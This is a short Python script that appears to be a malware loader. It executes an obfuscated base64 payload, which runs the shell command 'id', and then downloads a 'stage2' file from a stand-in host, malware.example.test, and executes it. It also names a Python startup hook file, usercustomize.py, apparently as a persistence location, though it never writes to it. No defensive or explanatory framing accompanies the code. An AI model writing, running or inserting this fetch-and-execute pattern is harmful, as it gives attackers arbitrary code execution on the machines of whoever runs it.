import base64
import urllib.request

hook = "/usr/lib/python3.11/site-packages/usercustomize.py"
blob = "aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQnKQ=="
exec(base64.b64decode(blob))
exec(urllib.request.urlopen("http://malware.example.test/stage2").read())
